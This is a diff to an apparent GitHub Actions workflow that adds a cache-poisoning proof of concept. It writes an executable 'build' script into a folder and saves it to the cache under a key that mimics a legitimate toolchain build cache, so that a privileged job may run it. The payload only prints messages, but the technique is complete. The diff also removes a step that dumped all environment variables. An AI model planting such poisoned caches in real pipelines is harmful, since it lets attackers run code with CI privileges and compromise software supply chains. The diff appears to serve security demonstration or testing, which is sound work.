@@ -10,8 +10,19 @@ jobs:
     permissions:
       contents: read
     steps:
-      - name: Show environment
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Create malicious payload
         run: |
-          echo "=== Environment Variables ==="
-          env
-          echo "=== End ==="
+          mkdir -p ./malicious-bin
+          echo '#!/bin/bash' > ./malicious-bin/build
+          echo 'echo "!!! Malicious code executed from poisoned cache !!!"' >> ./malicious-bin/build
+          echo 'echo "This step would run with high privileges."' >> ./malicious-bin/build
+          chmod +x ./malicious-bin/build
+
+      - name: Save poisoned cache
+        uses: actions/cache/save@v4
+        with:
+          path: ./malicious-bin
+          key: linux-build-${{ hashFiles('toolchain.lock') }}
